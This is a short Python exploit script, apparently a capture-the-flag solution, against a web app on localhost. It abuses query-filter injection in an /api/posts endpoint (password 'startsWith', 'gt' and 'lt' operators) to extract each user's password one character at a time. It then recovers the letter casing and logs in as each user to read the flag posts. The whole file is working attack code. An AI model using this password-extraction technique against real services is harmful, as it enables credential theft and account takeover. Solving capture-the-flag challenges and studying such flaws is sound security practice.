import requests
import pwn

pwn.log.level = pwn.logging.DEBUG

URL = "http://localhost:3000"

names = ["White", "Bob", "Tommy", "Sam"]
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

def check_password_starts_with(name: str, password: str) -> bool:
    url = f"{URL}/api/posts?author[name]={name}&author[password][startsWith]={password}"
    pwn.debug(f"{name} {password}")
    data = requests.get(url).json()
    return len(data["posts"]) > 0

def find_password(name: str) -> str:
    password = ""
    for _ in range(100):
        for char in characters:
            if check_password_starts_with(name, password + char):
                password += char
                break
        else:
            break
    return password

def check_password_casing(name: str, password: str) -> bool:
    url = f"{URL}/api/posts?author[name]={name}&author[password][gt]={password}a&author[password][lt]={password}z"
    pwn.debug(f"{name} {password}")
    data = requests.get(url).json()
    return len(data["posts"]) > 0

def find_password_casing(name: str, password: str) -> str:
    fixed_password = ""
    for char in password:
        if check_password_casing(name, fixed_password):
            fixed_password += char.lower()
        else:
            fixed_password += char.upper()
    return fixed_password

def get_flag(name: str, password: str):
    url = f"{URL}/api/login"
    data = requests.post(url, json={"name": name, "password": password}).json()
    for post in data["posts"]:
        if "uoft" in post["body"].lower():
            pwn.info(post["body"])

passwords = {}

for name in names:
    password = find_password(name)
    password = find_password_casing(name, password)
    passwords[name] = password

for name, password in passwords.items():
    pwn.info(f"{name}'s password is {password}")
    get_flag(name, password)




